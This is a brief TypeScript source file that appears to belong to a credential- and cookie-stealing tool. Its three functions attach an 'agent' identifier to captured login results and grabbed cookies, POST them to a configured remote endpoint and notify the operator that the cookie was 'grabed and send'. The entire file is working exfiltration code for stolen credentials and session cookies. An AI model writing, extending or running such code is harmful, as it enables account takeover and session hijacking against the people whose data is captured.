import { CookiesInfoType, LoginInfoType } from './types';
import { configHandler } from './configHandler';
import { notify } from './notifier';
import ky from 'ky';

export async function loginSuccess(info: LoginInfoType) {
  const config = await configHandler();
  info['agent'] = config.agent;
  ky.post(config.api_endpoint, { json: info });
  if (config.login_notification) {
    notify('success', 'Login Successed');
  }
}

export async function loginFailed(info: LoginInfoType) {
  const config = await configHandler();
  info['agent'] = config.agent;
  ky.post(config.api_endpoint, { json: info });
  if (config.login_notification) {
    notify('Failed', 'Login is failed');
  }
}

export async function cookiesSuccess(info: CookiesInfoType) {
  const config = await configHandler();
  info['agent'] = config.agent;
  ky.post(config.api_endpoint, { json: info });
  if (config.cookie_notification) {
    notify('Cookie Successfull', 'Cookie is grabed and send to ' + config.api_endpoint);
  }
}
